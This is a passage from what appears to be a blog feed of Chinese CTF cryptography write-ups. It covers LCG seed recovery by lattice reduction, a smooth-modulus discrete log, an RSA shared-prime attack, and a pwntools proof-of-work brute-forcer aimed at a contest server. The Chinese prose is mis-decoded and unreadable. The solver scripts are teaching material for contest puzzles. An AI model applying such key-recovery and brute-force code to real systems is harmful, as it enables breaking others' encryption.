class="line"><span class="string">h[i] &lt;&lt;= 64</span></span><br><span class="line"><span class="string">A = [1]</span></span><br><span class="line"><span class="string">B = [0]</span></span><br><span class="line"><span class="string">for i in range(1, len(h)-1):</span></span><br><span class="line"><span class="string">A.append(a*A[i-1] % m)</span></span><br><span class="line"><span class="string">B.append((a*B[i-1]+a*h[i]+b-h[i+1]) % m)</span></span><br><span class="line"><span class="string">A = A[1:]</span></span><br><span class="line"><span class="string">B = B[1:]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">M = matrix(ZZ, 21, 21)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(19):</span></span><br><span class="line"><span class="string">    M[i, i] = m</span></span><br><span class="line"><span class="string">    M[19, i] = A[i]</span></span><br><span class="line"><span class="string">    M[20, i] = B[i]</span></span><br><span class="line"><span class="string">    M[i, 19] = M[i, 20] = 0</span></span><br><span class="line"><span class="string">M[19, 19] =  1</span></span><br><span class="line"><span class="string">M[20, 20] = 2^64</span></span><br><span class="line"><span class="string">M[19, 20]= 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#print(B)</span></span><br><span class="line"><span class="string">vl = M.LLL()[0]</span></span><br><span class="line"><span class="string">l1 = vl[-2]</span></span><br><span class="line"><span class="string">h1 = h[1]</span></span><br><span class="line"><span class="string">s1 = l1+h1</span></span><br><span class="line"><span class="string">#s1 = a*seed+b %m</span></span><br><span class="line"><span class="string">seed = ((s1 - b)*inverse_mod(a,m))%m</span></span><br><span class="line"><span class="string">print(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, bit_length)</span>:</span></span><br><span class="line">b = <span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">a = <span class="number">107763262682494809191803026213015101802</span></span><br><span class="line">m = <span class="number">226649634126248141841388712969771891297</span></span><br><span class="line">seed = <span class="number">73991202721494681711496408225724067994</span></span><br><span class="line">self._key = &#123;<span class="string">'a'</span>:a, <span class="string">'b'</span>:b, <span class="string">'m'</span>:m&#125;</span><br><span class="line">self._state = seed</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">self._state = (self._key[<span class="string">'a'</span>] * self._state + self._key[<span class="string">'b'</span>]) % self._key[<span class="string">'m'</span>]</span><br><span class="line"><span class="keyword">return</span> self._state</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_key</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> self._key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_lcg</span><span class="params">()</span>:</span></span><br><span class="line">    rand_iter = LCG(<span class="number">128</span>)</span><br><span class="line">    key = rand_iter.export_key()</span><br><span class="line">    f = open(<span class="string">"key"</span>, <span class="string">"w"</span>)</span><br><span class="line">    f.write(str(key))</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_data</span><span class="params">(rand_iter)</span>:</span></span><br><span class="line">    f = open(<span class="string">"old"</span>, <span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        f.write(str(rand_iter.next() &gt;&gt; <span class="number">64</span>) + <span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(rand_iter)</span>:</span></span><br><span class="line">    f = open(<span class="string">"ct"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    key = rand_iter.next() &gt;&gt; <span class="number">64</span></span><br><span class="line">    key = (key &lt;&lt; <span class="number">64</span>) + (rand_iter.next() &gt;&gt; <span class="number">64</span>)</span><br><span class="line">    key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    iv = long_to_bytes(rand_iter.next()).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    pt = flag + (<span class="number">16</span> - len(flag) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(flag) % <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(pt.encode())</span><br><span class="line">    f.write(ct)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(rand_iter)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"ct"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">    key = rand_iter.next() &gt;&gt; <span class="number">64</span></span><br><span class="line">    key = (key &lt;&lt; <span class="number">64</span>) + (rand_iter.next() &gt;&gt; <span class="number">64</span>)</span><br><span class="line">    key = long_to_bytes(key).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    iv = long_to_bytes(rand_iter.next()).ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ct = cipher.decrypt(flag)</span><br><span class="line">    print(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    rand_iter = gen_lcg()</span><br><span class="line">    rand_iter = leak_data(rand_iter)</span><br><span class="line">    decrypt(rand_iter)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>&emsp;&emsp;ä»è¿™ä¸¤é¢˜æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè§£å†³HNPé—®é¢˜ï¼Œä¸€èˆ¬æˆ‘ä»¬éœ€è¦å¤šç»„æ•°æ®ï¼Œç„¶åæ¯ä¸€ç»„å°±åƒæ–¹ç¨‹ç»„ä¸­çš„æ¯ä¸€æ¡æ–¹ç¨‹ï¼Œæˆ‘ä»¬æ ¹æ®è¿™äº›æ–¹ç¨‹ç»„æ„é€ ä¸€ä¸ªLatticeï¼Œä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯ä¸€ä¸ªçŸ©é˜µï¼Œå°±å¥½åƒåœ¨ç”¨çŸ©é˜µè§£å†³çº¿ä»£ä¸­çš„ XA=B çš„é—®é¢˜ï¼Œè¿™ä¸ªBä¸­çš„æ¯ä¸€é¡¹æ˜¯æˆ‘ä»¬è·å¾—çš„MSBè¿™æ ·å­çš„æ¯”è¾ƒæ¨¡ç³Šçš„ä¿¡æ¯ï¼ˆä¸Šé¢ä¸¤é¢˜æˆ‘ä»¬æ‹¿åˆ°çš„éƒ½æ˜¯æœªçŸ¥é‡çš„bit_lengthï¼Œä¹Ÿç›¸å½“äºMSBï¼‰ã€‚ç„¶åè¿™ä¸ªBå‘é‡çš„é•¿åº¦ï¼ˆèŒƒå¼ï¼‰éœ€è¦ç›¸å¯¹ä¸æ ¼ä¸­å…¶ä»–å‘é‡è¦çŸ­ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨LLLç®—æ³•æ‰¾åˆ°è¿™ä¸ªBï¼Œè¿›è€Œæ ¹æ®æˆ‘ä»¬çš„æ„é€ ï¼Œç¡®å®šXå‘é‡ä¸­æˆ‘ä»¬éœ€è¦çš„ä¸€ä¸ªç‰¹å®šçš„å€¼ã€‚ä¹Ÿå°±æ˜¯æ–¹ç¨‹ç»„çš„è§£ã€‚</p><p>&emsp;&emsp;éœ€è¦å†æ¬¡è¯´æ˜çš„æ˜¯ï¼Œè¿™ä¸ªçŸ©é˜µæ‰€ä»£è¡¨çš„æ–¹ç¨‹ç»„å¹¶éåƒçœŸæ­£çš„çº¿ä»£ä¸­çš„XA=Bé—®é¢˜ä¸­çš„æ–¹ç¨‹ç»„â€”â€”æ˜¯å¤šå…ƒçš„ã€‚æˆ‘ä»¬è¿™é‡Œçš„æ–¹ç¨‹ç»„æ˜¯ä¸€å…ƒçš„ã€‚å¦‚æœæ­£å¸¸è§£æ–¹ç¨‹çš„è¯ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆå¤šæ¡æ–¹ç¨‹éƒ½ç®—ä¸å‡ºè§£ï¼Œå°±æ˜¯å› ä¸ºæˆ‘ä»¬å¾—åˆ°ä¿¡æ¯æ˜¯æ¨¡ç³Šçš„ï¼Œå¹¶éæ˜¯å‡†ç¡®çš„ã€‚æ•…æˆ‘ä»¬éœ€è¦ç”¨åˆ°æ ¼ç†è®ºï¼Œå’Œä¸€ä¸ªè¶…å¥½ç”¨çš„LLLç®—æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Lattice </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
            <tag> Dsa </tag>
            
            <tag> LCG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 ç½‘é¼æ¯</title>
      <link href="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="é’é¾™ç»„"><a href="#é’é¾™ç»„" class="headerlink" title="é’é¾™ç»„"></a>é’é¾™ç»„</h1><h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><p><code>first:this string md5:46e5efe6165a5afb361217446a2dbd01</code></p><p>å»<a href="https://chamd5.org" target="_blank" rel="noopener">åœ¨çº¿ç½‘ç«™</a>æŸ¥å¾—:en5oy</p><p><code>This time:Here are have some formulas 3x-y+z=1852x+3y-z=321x+y+z=173input: x =</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var(&apos;x y z&apos;)</span><br><span class="line">solve([3*x-y+z==185,2*x+3*y-z==321,x+y+z==173],[x,y,z])</span><br></pre></td></tr></table></figure><p><code>Last time: Kill itx*x+x - 7943722218936282 = 0input x:</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">var</span><span class="params">(<span class="string">'x'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">solve</span><span class="params">([x * x + x - <span class="number">7943722218936282</span> == <span class="number">0</span>],[x])</span></span></span><br></pre></td></tr></table></figure><h2 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you raise me up"></a>you raise me up</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">random</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="built_in">random</span>.randint(<span class="number">2</span>, n<span class="number">-1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'m = '</span> + str(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'c = '</span> + str(c)</span><br><span class="line"></span><br><span class="line"><span class="meta"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="meta"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br></pre></td></tr></table></figure><p>é¢˜ä¸­æˆ‘ä»¬çš„flagåœ¨mçš„æŒ‡æ•°ä½ç½®ï¼Œæ‰€ä»¥è¿™é¢˜æ˜¯è§£ä¸€ä¸ªDLP(ç¦»æ•£å¯¹æ•°é—®é¢˜)</p><p>å‘ç°é¢˜ä¸­çš„n = 2 ** 512ï¼Œ æ‰€ä»¥phi(n) =  2 ** 511ï¼›å³æœ¬é¢˜æ¨¡æ•°çš„æ¬§æ‹‰å‡½æ•°å…·æœ‰smoothçš„æ€§è´¨ï¼Œå³å…¶æ˜¯ç”±å¾ˆå¤šå°ç´ æ•°ä¹˜ç§¯è€Œæ¥ï¼Œæ‰€ä»¥å¯ç”¨Pohlig Hellman ç®—æ³•æ¥è§£å†³è¿™ä¸ªDLPï¼Œsageçš„discrete_logç”¨çš„æ–¹æ³•å°±åŒ…æ‹¬Pohlig Hellmanç®—æ³•ï¼Œexpï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span><br><span class="line">c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span><br><span class="line">n = 2 ** 512</span><br><span class="line">m = Mod(m,n)</span><br><span class="line">c = Mod(c,n)</span><br><span class="line">discrete_log(c,m)</span><br></pre></td></tr></table></figure><h2 id="easy-ya"><a href="#easy-ya" class="headerlink" title="easy_ya"></a>easy_ya</h2><p>é¢˜ç›®ä»£ç </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span><span class="built_in"> secret </span>import flag,key</span><br><span class="line"><span class="keyword">from</span> random import randint</span><br><span class="line"><span class="keyword">from</span> libnum import n2s,s2n</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number import getPrime</span><br><span class="line">limit = lambda n: n &amp; 0xffffffff</span><br><span class="line"><span class="attribute">padding</span>=<span class="string">"\xe6\xe6\xe7\xe6\xe5\xe6\xe5\xe9\xe5"</span></span><br><span class="line"><span class="attribute">ek</span>=<span class="string">'\xe6\x84\xbf'</span></span><br><span class="line">def encode(key,data):</span><br><span class="line">    pad  = randint(0x10000000,0xffffffff)</span><br><span class="line">    Key  = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    Data = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    a = limit((Key[0] &lt;&lt; 24) | (Key[1] &lt;&lt; 16) | (Key[2] &lt;&lt; 8) | Key[3])</span><br><span class="line">    b = limit((Key[4] &lt;&lt; 24) | (Key[5] &lt;&lt; 16) | (Key[6] &lt;&lt; 8) | Key[7])</span><br><span class="line">    c = limit((Key[8] &lt;&lt; 24) | (Key[9] &lt;&lt; 16) | (Key[10] &lt;&lt; 8) | Key[11])</span><br><span class="line">    d = limit((Key[12] &lt;&lt; 24) | (Key[13] &lt;&lt; 16) | (Key[14] &lt;&lt; 8) | Key[15])</span><br><span class="line">    y = limit((Data[0] &lt;&lt; 24) | (Data[1] &lt;&lt; 16) | (Data[2] &lt;&lt; 8) | Data[3])</span><br><span class="line">    z = limit((Data[4] &lt;&lt; 24) | (Data[5] &lt;&lt; 16) | (Data[6] &lt;&lt; 8) | Data[7])</span><br><span class="line">    pads = 0</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(32):</span><br><span class="line">        pads = limit(pads + pad)</span><br><span class="line">        y = limit( y + ((z<span class="number">*16</span> + a) ^ (z + pads) ^ ((z&gt;&gt;5) + b)))</span><br><span class="line">        z = limit( z + ((y<span class="number">*16</span> + c) ^ (y + pads) ^ ((y&gt;&gt;5) + d)))</span><br><span class="line">    <span class="builtin-name">print</span> hex((y &lt;&lt; 52) ^ (pads &lt;&lt; 20) ^ z)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pow_check()</span></span><br><span class="line"><span class="comment">#token_check()</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">flag</span>=flag.ljust(len(flag)+(-len(flag)&amp;7),'\x00')</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(flag)/8):</span><br><span class="line">    encode(key,flag[8*i:8*i+8])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(9):</span><br><span class="line">    ek+=padding[i] + key[2*i:2*i+2]</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>=getPrime(2048)</span><br><span class="line"><span class="attribute">e</span>=0x10001</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(2):</span><br><span class="line">    <span class="attribute">q</span>=getPrime(2048)</span><br><span class="line">    <span class="attribute">n</span>=p*q</span><br><span class="line">    <span class="builtin-name">print</span> n</span><br><span class="line">    <span class="builtin-name">print</span> pow(s2n(ek),e,n)</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥éœ€è¦å»äº¤äº’ï¼Œæ‹¿åˆ°å››ä¸ªå¤§æ•°ï¼Œå…¶ä¸­ä¸¤ä¸ªæ˜¯æœ‰å…¬å› å­pçš„å¤§æ•°nï¼Œè¿˜æœ‰ä¸¤ä¸ªå°±æ˜¯ekçš„å¯†æ–‡ã€‚è¿™ä¸€æ­¥å°±æ˜¯å‡‘æ•°çš„partï¼Œæ²¡ç‚¹è¥å…»ã€‚<del>åæ§½ï¼Œäº¤äº’çš„æ—¶å€™ä»€ä¹ˆæ²™é›•PoWï¼Œæœ‰å¿…è¦å¡è¿™ä¸ªå˜›</del></p><p>ç ´PoWçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = remote(<span class="string">"39.96.90.217"</span>,<span class="string">"17497"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"x[:20] = "</span>)</span><br><span class="line">pa = sh.recv(len(<span class="string">'f91a551dfa31e47458df'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'openssl_sha'</span>)</span><br><span class="line">fun = sh.recvuntil(<span class="string">"&gt;"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">table = string.printable</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpow</span><span class="params">(fun,mess)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> table:</span><br><span class="line">                    password=i+j+k+l</span><br><span class="line">                    <span class="keyword">if</span> fun == <span class="string">"256"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"384"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha384(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"1"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha1(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"512"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha512(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"224"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha224(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(fun)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"no ans"</span>)</span><br><span class="line">                        </span><br><span class="line">sh.sendline(getpow(fun,pa))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ç„¶ä¹æˆ‘ä»¬è¾“å…¥tokenï¼Œæ‹¿åˆ°è‡ªå·±çš„data</p><p>è§£å¾—ek</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">n1 = </span><br><span class="line">n2=</span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">q2 = n2//p</span><br><span class="line">assert n1 == p*q1</span><br><span class="line">assert n2 == p*q2</span><br><span class="line">c1 = </span><br><span class="line">e = 65537</span><br><span class="line">phi = (p-1)*(q2-1)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = pow(c2,d,n2)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;æ„¿æˆ‘æ‰€çˆ±æ— å¿§æ™å²é•¿å®‰</span><br></pre></td></tr></table></figure><p>python2ä¸‹ä¼šå¾—åˆ°è¿™ä¹ˆä¸ªekï¼Œæœ‰ç‚¹æ„æ€å—·ï¼Œ<del>ä½†ä½ è¿˜æ˜¯æ²™é›•å‡ºé¢˜äººï¼Œè°è®©ä½ ç”¨PoWå¡æˆ‘</del></p><p>python3è¿è¡Œå¾—åˆ°<code>b&#39;\xe6\x84\xbf\xe6\x88\x91\xe6\x89\x80\xe7\x88\xb1\xe6\x97\xa0\xe5\xbf\xa7\xe6\x81\x99\xe5\xb2\x81\xe9\x95\xbf\xe5\xae\x89&#39;</code></p><p>ç„¶åå»æ‰è¯¥å»çš„å°±èƒ½å¾—åˆ°keyäº†<code>&#39;\x88\x91\x89\x80\x88\xb1\x97\xa0\xbf\xa7\x81\x99\xb2\x81\x95\xbf\xae\x89&#39;</code></p><p>ç„¶åå°±æ˜¯é€†è¿™ä¸ªencodeäº†ã€‚</p><p>å…¶ä¸­æˆ‘ä»¬äº¤äº’çš„æ—¶å€™æ‹¿åˆ°äº”ç»„å¯†æ–‡ï¼Œæ˜“å¾—ï¼Œæ¯ç»„å¯†æ–‡ä¸­ï¼Œä¿å­˜äº†encodeä¸­32è½®åŠ å¯†åçš„å®Œæ•´çš„yï¼Œpadså’Œæœ‰ä¸€éƒ¨åˆ†é‡åˆã€‚ä½†æ˜¯padsåŠ äº†32æ¬¡padåï¼Œæœ€å5ä½å·²ç»å˜æˆ0äº†ã€‚æ‰€ä»¥zæˆ‘ä»¬å¯ä»¥çŸ¥é“20+5 = 25ä½ï¼Œå‰©ä¸‹ä¸ƒä½æœªçŸ¥ã€‚</p><p>ç„¶åæˆ‘ä»¬å°±å»çˆ†padï¼Œæˆ‘ä»¬ä»å¯†æ–‡é‡Œå¤´èƒ½çŸ¥é“padçš„52-32=20ä½ã€‚ä½†è¿™20ä½å…¶å®æ˜¯ä¸­é—´éƒ¨åˆ†çš„ã€‚æœ€é«˜çš„5ä½å·²ç»è¢«limitææ²¡æ‰äº†ã€‚ç„¶åæœ€ä½çš„7ä½æˆ‘ä»¬ä¹Ÿæ˜¯ä¸çŸ¥é“çš„ã€‚æ‰€ä»¥ï¼Œï¼Œï¼Œçˆ†ã€‚æˆ‘ä»¬çˆ†äº†ä½7ä½çš„åŒæ—¶ï¼Œä¹Ÿèƒ½ç¡®å®šä¸€ä¸ªzï¼Œç„¶åååŠ å¯†çœ‹ç»“æœå’¯ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">limit = <span class="keyword">lambda</span> n: n &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'\x88\x91\x89\x80\x88\xb1\x97\xa0\xbf\xa7\x81\x99\xb2\x81\x95\xbf\xae\x89'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(key)</span>:</span></span><br><span class="line">    Key  = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    <span class="comment">#Data = [ord(i) for i in data]</span></span><br><span class="line">    a = limit((Key[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">3</span>])</span><br><span class="line">    b = limit((Key[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">5</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">6</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">7</span>])</span><br><span class="line">    c = limit((Key[<span class="number">8</span>] &lt;&lt; <span 